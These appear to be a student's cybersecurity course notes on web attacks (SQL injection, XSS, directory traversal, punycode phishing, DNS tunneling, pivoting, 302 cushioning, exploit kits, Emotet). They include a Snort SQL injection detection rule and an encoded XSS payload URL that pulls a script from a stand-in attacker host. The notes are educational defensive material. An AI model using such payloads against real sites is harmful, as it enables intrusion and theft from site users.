| URL Structure         | The URL, including the port number, provides access to the website.                                                                                                                                               |
| Directory Navigation  | Using ..\ sequences in the URL navigates the file system, similar to command line navigation.                                                                                                                     |
| File Access: Entering | ..\ sequences in the URL allows access to files on the web server, such as boot.ini.                                                                                                                              |
# [[SQL Injection]]

- ==Definition==: Malicious actors exploit vulnerabilities in web applications to execute malicious SQL code on database servers.
- ==Attack Mechanism==: Attackers inject specially crafted SQL statements into input fields, which are then executed by the database, potentially leading to unauthorized access or data manipulation.
- ==Consequences==: Successful attacks can result in bypassing authentication, disclosing confidential information, and distributing malicious code, causing significant damage to the targeted system.

| Factor            | Description                                                            |
| ----------------- | ---------------------------------------------------------------------- |
| High-value target | Servers often perform multiple roles within a network.                 |
| Vulnerability     | Insufficient input validation and improper SQL statement construction. |
| Attack types      | Data extraction, data manipulation, and command execution.             |

| Attack Type                      | Description                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| -------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Authentication bypass            | Allows an attacker to log on to an application, potentially with administrative privileges, without supplying a valid username and password.                                                                                                                                                                                                                                                                                                        |
| Information disclosure           | Allows an attacker to obtain, either directly or indirectly, sensitive information in a database.                                                                                                                                                                                                                                                                                                                                                   |
| Compromised data integrity       | Involves the alteration of the contents of a database. An attacker could use this attack to deface a web page or more likely to insert malicious content into otherwise innocuous web pages.                                                                                                                                                                                                                                                        |
| Compromised availability of data | Allows an attacker to delete information with the intent to cause harm or delete log or audit information in a database.                                                                                                                                                                                                                                                                                                                            |
| Remote command execution         | Performing command execution through a database can allow an attacker to compromise the host operating system. These attacks often follow an existing, predefined stored procedure for host operating system command execution. The most recognized variety of this attack uses the xp cmdshell stored procedure that is common to Microsoft SQL server installations or uses the ability to create an external procedure call on Oracle databases. |
## IPS Signatures

| Feature               | Description                                                                                                                                  |
| --------------------- | -------------------------------------------------------------------------------------------------------------------------------------------- |
| IPS Effectiveness     | Depends on visibility into application traffic.                                                                                              |
| IPS Limitation        | Cannot detect SQL injection attacks in applications using end-to-end encryption with HTTPS.                                                  |
| HTTPS Impact          | IPS cannot identify SQL injection attacks in applications using HTTPS without termination or acceleration at an intermediate network device. |
| Signature Development | New signatures are continually developed based on new security intelligence.                                                                 |
| Signature Location    | Latest signature releases are on the Cisco IPS Services section of the Cisco Security Intelligence Operations Portal.                        |
| Signature Function    | Signatures are pattern-matching rules for detecting malicious activity; better patterns lead to more reliable detection.                     |
```
alert tcp  $EXTERNAL_NET any  ->  $HTTP_SERVERS  $HTTP_PRTS  (msg:”SQL Injection – Paranoid”; flow:to_server,established;uricontent:”.pl”;pcre:”/(\%27) | (\’) |\-\-) | (%23) | (#)/I”; classtype:web-application-attack; sid:9099; rev:5;)
```

| Field                            | Description                                                                                                                                        |
| -------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| Alert                            | Generate the IDS alert                                                                                                                             |
| TCP                              | TCP protocol only, which relates to the HTTP traffic, which is TCP                                                                                 |
| Any -> Any                       | Any source IP address and any source port can trigger this alert                                                                                   |
| ->                               | An operand that separated the source and destination of this event                                                                                 |
| $HTTP_SERVERS                    | A variable that allows the administrator to maintain a list of servers that can be monitored                                                       |
| $HTTP_PORTS                      | A variable that allows the administrator to define the common HTTP ports such as 80, 8080, and 443                                                 |
| msg: “SQL Injection Paranoid”    | The actual message that appears in the alert                                                                                                       |
| flow:to_server                   | The direction of traffic flow of the activity                                                                                                      |
| Established                      | Alerts only on established TCP connections                                                                                                         |
| uricontent:”.pl”                 | Alerts only on URIs that end in “.pl” or perl applications                                                                                         |
| Note                             | This alert will need to be modified to detect and fire with other languages.                                                                       |
| Pcre:”/(%27)..:                  | The regular expression that is generated by the administrator to generate the alert. In this example, it is the Perl compatible regular expression |
| Classtype:web-application-attack | Defines the class of attack that the signature will fire on, which in this example would be for a custom web application                           |
| sid                              | The Snort identification number; when used with the revision number, it helps update and track Snort signatures                                    |
| Rev                              | The revision of the signature helps versioning control and tracking of signature changes                                                           |
## [[Cross-Site Scripting]]

- ==Definition==: Maliciously causing a script, typically JavaScript, to execute in a user’s browser.
- The victim is not aware that a malicious XSS attack has taken place on their system.

3 Types of XSS:

| Type                          | Description                                                                                        | Attack Method                                                                                              | Vulnerability                                                                                                        | Impact                                                                                                                                      |
| ----------------------------- | -------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| Stored (persistent XSS)       | Malicious code embedded within a stored page on the web server.                                    | Embedding malicious code within a stored page on the web server, such as comment boxes and message boards. | Failure of the server to sanitize input, allowing the attacker’s code to be posted and displayed to all users.       | Extraction of sensitive information, execution of malicious code, session cookie hijacking, site redirection, and malicious code execution. |
| Document Object Model (DOM)   | DOM is a class of JavaScript that defines objects within HTML elements for use by the web browser. | Threat actor sends a message to a client containing a JavaScript URL embedded with malicious script tags.  | Threat actors can modify the browser’s DOM to extract sensitive information or execute malicious code.               | Extraction of sensitive information, execution of malicious code, session cookie hijacking, site redirection, and malicious code execution. |
| Reflected (nonpersistent XSS) | HTML code injected into a link, knowing the target page will fail to sanitize it.                  | The user needs to click the link containing the HTML code again for the code to be executed.               | An attacker can append the user login session cookie onto the URL of an image being requested from an external site. | Potential masquerading as the user, gaining the full permissions of that user on the site.                                                  |
# [[Punycode]]
- ==Purpose==: Represents Unicode characters in ASCII format for DNS compatibility.
- ==Format==: `xn—<\URL minus special characters>-<\codes for special characters>.<TLD… (.com .net .org )>.`
- ==Example==: fàcebook.com 
  becomes xn—fcebook-lta.com.
  ![8](/Course-Notes/.assets/Pasted_image_20241119222907.png)

| Example                                                                 | Description                                                                                                                                        |
| ----------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| Spam Email                                                              | Spam emails can include product/service offers, financial transaction requests, and phishing attempts.                                             |
| Phishing Email                                                          | Might appear legitimate, claiming a Facebook account compromise and prompting password reset.                                                      |
| Malicious Link                                                          | Might use a character substitution (e.g., [www.fàcebook.com](http://www.xn--fcebook-8va.com/)) to deceive users and lead them to a malicious site. |
| Non-ASCII characters in URLs                                            | Non-ASCII characters can be used in countless ways to fool people. Punycode itself can hide nefarious URLs.                                        |
| Replacing all “i” characters in a link with the Cyrillic version of “i” | The address in the browser appears as a manually typed URL, but with Cyrillic “i”s converted to Punycode.                                          |
| Browser                                                                 | The browser recognizes the URL as similar to a legitimate website and offers a suggestion.                                                         |
| Behavior                                                                | Users clicking on illegitimate links do not receive the same browser suggestion.                                                                   |
![7](/Course-Notes/.assets/Pasted_image_20241119223044.png)
# [[DNS Tunneling]]

| Feature         | Description                                                                                                            |
| --------------- | ---------------------------------------------------------------------------------------------------------------------- |
| Purpose         | Enables tunneling of another protocol through DNS for command and control, data exfiltration, or IP traffic tunneling. |
| Setup           | Attacker sets up a DNS server with a tunneling tool like Iodine.                                                       |
| Mechanism       | Malicious server acts as authoritative name server for a specific domain.                                              |
| Characteristics | Often unmonitored and doesn’t require stealth, utilizing DNS for data transmission.                                    |
![6](/Course-Notes/.assets/Pasted_image_20241120111013.png)

| Feature   | Description                                                                                                      |
| --------- | ---------------------------------------------------------------------------------------------------------------- |
| Benefit   | Difficult to detect due to the normal and expected nature of DNS traffic on a network.                           |
| Drawback  | Slow speed and limited communication capabilities, as it typically doesn’t allow server-to-client communication. |
| Detection | Examining payloads, packet size, frequency of requests, and unusual hostnames.                                   |
| Patterns  | Attackers may use a large bandwidth footprint or throttle usage to blend in with normal DNS traffic.             |
# [[Pivoting]]

- ==Definition==: A method used by attackers to bypass network restrictions and attack other computers.
- ==Purpose==: To exploit computers on inaccessible networks by using a compromised computer as a proxy.
- ==How Pivoting Works==: Utilizes an existing session on a dual-homed computer to act as a bridge between networks.

The attack box (192.168.81.125) lacks direct access to the 192.168.63.0/24 network. However, the web server can access both networks. Compromising the web server allows the attack computer to access the 192.168.63.0/24 network via pivoting.

![5](/Course-Notes/.assets/Pasted_image_20241120113933.png)
# [[HTTP 302 Cushioning]]

- ==HTTP Redirection==: A website can change the path to a resource using an HTTP redirect, directing the user’s browser to the new location.
- ==HTTP 302==: Response status code is commonly used for URL redirection.
- ==Security Implications==: Attackers exploit legitimate HTTP functions like HTTP redirects for attacks, making it crucial for securi

| Component                        | Description                                                                                                                                                                      |
| -------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ==Location Header==              | The URL of the new location.                                                                                                                                                     |
| ==Browser Interpretation==       | Browser should make an identical request to the new URL.                                                                                                                         |
| ==Malware Obfuscation==          | Attackers use web redirections to obfuscate the malware download source. Redirections are also less likely to raise suspicions as compared to hidden iFrames or external scripts |
| ==Web Redirection Mechanism==    | Attackers utilize “302 Found” responses to create a series of redirections, leading to the exploit delivery page.                                                                |
| ==Purpose of Redirection Gates== | Frequently changing URLs of intermediate websites (gates) hinder attack analysis and make source determination difficult.                                                        |
![4](/Course-Notes/.assets/Pasted_image_20241120125510.png)
1. The attacker has compromised a legitimate website (example.com).
2. The attacker causes the website to respond to the victim’s HTTP request with a 302 Found HTTP response status code.
3. This creates a series of HTTP 302 redirects through the attacker’s proxies.
4. The victim’s browser is finally redirected to the attacker’s web page that spreads the malicious exploit to the victim

- ==Goal==: Ensure the victim’s web browser ends up on the attacker’s web page.
- ==Method==: Using iFrame or HTTP 302 cushioning.
- ==Malicious Exploit==: Served out to the victim from the attacker’s web page.

| Countermeasures          | Description                                                                                                                                          |
| ------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| Cloud-based DNS security | Service such as Cisco Umbrella to block users from accessing malicious websites.                                                                     |
| Web proxy security       | Solution, such as the Cisco Web Security Appliance (WSA) to block users from accessing malicious websites.                                           |
| Educate end users        | On how the browser is redirected to a malicious web page that delivers the exploit to the victim’s machine through a series of HTTP 302 redirections |
# [[Gaining Access Via Web-Based Attacks]]
- ==Definition==: A software application accessed through a browser using HTTP.
- ==Attack Investigation==: Requires understanding both attacks on the web application itself and client-side web-based attacks.

| Component  | Description                                                                                                                                             | Example                                                                                                                                                                                                                                                |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Scheme:    | A protocol for accessing a resource                                                                                                                     | HTTP, HTTPS, FTP                                                                                                                                                                                                                                       |
| Authority: | The name of the server where the resource is located.                                                                                                   | [http://www.example.com](http://%60www.example.com%60/)                                                                                                                                                                                                |
| Path:      | The name of the resource and the path to the resource being requested.                                                                                  | [http://www.example.com/myvideo.mp4](http://www.example.com/%60myvideo.mp4%60)                                                                                                                                                                         |
| Query:     | Often generated by a browser. It does not fit conveniently into the hierarchical path. The query, or query string, is everything to the right of the ?. | [http://www.example.com:8443/cucm-uds/users?name=Bob](http://www.example.com:8443/cucm-uds/users%60?name=Bob%60)                                                                                                                                       |
| Fragment:  | Immediately follows a #. A fragment requests a specific resource that is secondary and subordinate.                                                     | The URI below contains a scheme, an authority, a path, and a fragment that requests only seconds 20 through 50 of a video that is named myvideo.<br><br>[http://www.example.com/myvideo.mp4#t=20,50](http://www.example.com/myvideo.mp4%60#t=20,50%60) |

The attacker manipulate the URI and fool a web server into executing a malicious script, obfuscated by encoded characters.

http://victim.com/weakscript.php?data=%3cscript%20src=%22http%3a%2f%2fwww.badguy.com%2fbadscript.js%22%3e%3c%2fscript%3e

1. This attacker uses a PHP script hosted on the victim’s server that allows external scripts to be referenced and executed.
2. To hide the attack, the attacker uses ASCII encoded characters rather than standard characters hoping that such an obvious intrusion will go undetected. 
3. Web servers are designed to understand encoded characters as a way of passing non-printable characters to the server. So, the server interprets the URI above in the following way:

http://victim.com/weakscript.php?data= \<script src=”http://www.badguy.com/badscript.js”> \</script>

Encoded characters map to standard characters as follows:

- %3c = <
- %20 = (a space character)
- %22 = “
- %3a = :
- %27 = ‘
- %2e = .
- %2f = /
- %3e = >
- %5c = \

| **Category**                 | **Description**                                                                                                                                                     |
|------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Attack Vector**             | Exploiting vulnerabilities in web applications to upload files.                                                                                                    |
| **Attack Method**             | Utilizing functions like file replacement to upload malicious files.                                                                                                |
| **Impact**                    | Allowing attackers to upload undesired files to the victim’s web server.                                                                                            |
| **Attack Goal**               | Gain console-level access to the web server and run commands with the same privileges as the web services.                                                           |
| **Attack Method**             | Use the “..” portions of the parameter to navigate to a known directory or the root folder.                                                                         |
| **Attack Objective**          | Access and execute a web shell to gain control over the web server.                                                                                                 |
| **File Upload Vulnerabilities** | Can be exploited for XSS attacks, including stored and reflected attacks.                                                                                          |
| **XSS Attack Impact**         | Allows attackers to retrieve sensitive information from victims’ computers, such as session cookies.                                                                |
# [[Exploit Kits]]

- ==Definition==: Sets of tools used to gain access to targeted hosts, often through automated exploitation of client-side vulnerabilities.
- ==Targeted Applications==: Primarily web browsers and other programs that websites can interact with through the browser.
- ==User-Friendliness==: Designed for ease of use, even for non-technical threat actors, providing a web interface for tracking infection campaigns

| Step                      | Description                                                                                                      |
| ------------------------- | ---------------------------------------------------------------------------------------------------------------- |
| Delivery                  | Utilizes drive-by downloads, malicious ads, and compromised websites to redirect users to exploit kit servers.   |
| Domain Shadowing          | Attackers compromise domain registration information to create “shadow domains” for hosting malicious redirects. |
| Framework                 | Hosted on malicious servers, these frameworks contain exploits and payloads to compromise systems.               |
| Exploit Kit Functionality | Uses PHP scripts to manage attacks, view victim count, and monitor traffic to malicious servers.                 |
| Exploit Kit Development   | Developed by specific authors and licensed to cybercriminals for use in distributing malware.                    |
| Exploit Kit Purpose       | Designed to attack victim computers and deliver malware.                                                         |
| Exploit Kit Functionality | Scans victim’s software for vulnerabilities and downloads exploit code to compromise them.                       |
| Malicious Code Execution  | Secretly runs malicious code on the victim’s machine to connect it to the malware download server.               |
| Payload Download          | The malicious code downloads the payload from the malware download server.                                       |
| Payload                   | Can be a file downloader or the final malware.                                                                   |
| Delivery                  | Sent as an encrypted file in advanced exploits.                                                                  |
| Execution                 | Decrypted and executed on the victim’s machine.                                                                  |
| Remote system control     | Enabling attackers to create platforms for further malicious activities.                                         |
| Availability              | These kits are available through open-source downloads and for purchase on underground forums.                   |
| Value                     | A small investment in an exploit kit can yield significant returns if used effectively against target systems.   |
**Exploit kit Attack Chain:**
![3](/Course-Notes/.assets/Pasted_image_20241120145551.png)

| Component             | Description                                                                                                                                                                       |
| --------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Landing Page          | Gathers data about the victim’s Windows computer and finds vulnerable applications.                                                                                               |
| Exploit Kit’s Goal    | To take advantage of vulnerable applications to run malware on the targeted system.                                                                                               |
| Payload Delivery      | Malware designed to infect a Windows computer, delivered as an executable (.exe) or dynamic link library (.dll) file.                                                             |
| Exploit Kit Threat    | Exploit kits exploit vulnerabilities to deliver malware, posing a significant threat due to their ability to quickly exploit unpatched vulnerabilities.                           |
| Exploit Kit Evolution | Exploit kits are increasingly adopting fileless attack methods, injecting malicious code directly into RAM instead of relying on dropped payloads.                                |
| Exploit Kit Market    | Exploit kits are commercially available, with creators licensing and supporting them in underground forums, incentivizing continuous updates and new vulnerability incorporation. |
**Examples of exploit kits include:**
- **==Neutrino==:** Targets Java Runtime Environment; drops ransomware on target systems and uses fileless techniques to infect hosts.
- **==Magnitude==:** Commonly used to drop Magniber ransomware on target systems and uses fileless deployment techniques to infect hosts.
- **==Angler==:** Targeted vulnerabilities in outdated software and is one of the most notorious, versatile, and innovative toolkits capable of installing “invisible” malware via drive-by tactics and collecting sensitive user data (usernames, passwords, credit card info).
- **==Nuclear==:** Largely targets vulnerable Adobe Flash vulnerabilities; mostly safe from antivirus detection 
- **==RIG==:** Like most exploit kits, redirects users through malicious iframes injected into compromised websites and malvertising; uses Flash exploits; most common payloads were variants of the Tofsee spambot.
- **==Spelevo==:** Appears to use domain shadowing and is being hosted using domain names instead of hardcoded IP addresses; attempts to deliver exploits via a vulnerable version of Flash or via a use-after-free vulnerability in the VBScript engine of Internet Explorer.

# [[Emotet Advanced Persistent Threat]]

| Malware Type          | Highly modular threat capable of delivering various payloads, initially designed as banking Trojans.                                                                                                               |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Evolution and Payload | Initially a banking Trojan, Emotet has evolved to deliver various payloads, including Ryuk ransomware, and is known for stealing and reusing email accounts for impersonation.                                     |
| Infection Vector      | Emotet primarily infects systems through malicious emails, often impersonating known contacts, and utilizes a network of stolen SMTP accounts for its campaigns. often disguised as macro-laden documents or URLs. |
| Propagation Method    | Emotet steals email credentials to impersonate victims and spread itself, utilizing a network of stolen SMTP accounts.                                                                                             |
![2](/Course-Notes/.assets/Pasted_image_20241120152015.png)

| Category                         | Description                                                                                                           |
| -------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
| Victim Identification Challenges | Emotet sometimes removes personal data and TLDs, making it difficult to identify the original victim.                 |
| Impersonation Techniques         | Emotet impersonates organizations by stripping personal data and TLDs, leading to domain shortening.                  |
| Emotet’s Tactics                 | Emotet often includes contact information and previous email content to make the message seem authentic.              |
| Targeted Attack                  | Emotet specifically targets individuals, as seen in the example targeting a staff member of U.S. Senator Cory Booker. |
| Email Appearance                 | Emotet spoofs the email address to appear as if it originated from an infected colleague.                             |
![1](/Course-Notes/.assets/Pasted_image_20241120152433.png)

| Threat Type               | Description                                                                                                                           |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| Malware Functionality     | Enumerates network resources, brute forces access to administrator and user accounts, spreads via SMB protocol, and exfiltrates data. |
| Exfiltration Capabilities | Exfiltrates emails, sender/recipient information from IPM root folder, and emails sent/received within the last 180 days.             |
| Secondary Payloads        | TrickBot, IcedID, QuakBot, AzoRult, Ursnif/Gootkit, and Zeus Panda Banker Trojans.                                                    |
| Threat Delivery           | Emotet delivers modular, malicious payloads to monetize infections.                                                                   |
| Payload Types             | Banking Trojans, stealers, self-propagation, email harvesters, and ransomware.                                                        |
| Emotet Characteristics    | Often arrive via hijacked email threads, making them difficult for antispam systems to identify.                                      |
| Mitigation Strategy       | Combine advanced antispam systems with user awareness training for effective defense against Emotet.                                  |

